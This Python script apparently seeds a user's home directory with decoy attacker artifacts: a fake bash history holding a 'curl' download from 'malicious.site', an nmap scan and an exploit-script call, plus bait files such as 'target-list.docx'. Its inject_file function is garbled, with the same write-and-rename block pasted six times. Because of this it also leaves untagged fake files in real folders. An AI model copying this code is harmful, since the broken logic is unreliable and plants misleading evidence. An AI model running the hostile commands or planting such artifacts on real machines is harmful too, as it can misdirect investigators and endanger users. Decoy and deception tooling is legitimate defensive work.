import os
import random
import time
from modules.core.tags import tag_fake

FAKE_ARTIFACTS = {
    ".bash_history": [
        "curl -O http://malicious.site/payload.sh",
        "nmap -A 10.0.0.5",
        "python3 exploit-CVE-2025-xxxx.py"
    ],
    "Downloads": [
        "payload_generator_final.py"
    ],
    "Documents": [
        "operation-notes.txt",
        "target-list.docx",
        "post-ex-analysis.pdf"
    ]
}

def inject_file(full_path, content):
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    tagged_path = full_path + ".fake"
    os.rename(full_path, tagged_path)
    print(f"[FAKE] {tagged_path} created.")
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    tagged_path = full_path + ".fake"
    os.rename(full_path, tagged_path)
    print(f"[FAKE] {tagged_path} created.")
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    tag_fake(full_path)
    print(f"[FAKE] {full_path + ".fake"} created.")
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    tag_fake(full_path)
    print(f"[FAKE] {full_path + ".fake"} created.")
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    tag_fake(full_path)
    print(f"[FAKE] {full_path}.fake created.")
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    print(f"[FAKE] {full_path} created.")
def main():
    user_home = os.path.expanduser("~")
    for folder, files in FAKE_ARTIFACTS.items():
        if folder == ".bash_history":
            for content in FAKE_ARTIFACTS[".bash_history"]:
                inject_file(os.path.join(user_home, ".bash_history.fake"), content)
        else:
            dir_path = os.path.join(user_home, folder)
            for file in files:
                fake_content = f"This is a fake artifact.\nTimestamp: {time.ctime()}\n\n"
                inject_file(os.path.join(dir_path, file), fake_content + random.choice(FAKE_ARTIFACTS[".bash_history"]))

if __name__ == "__main__":
    main()
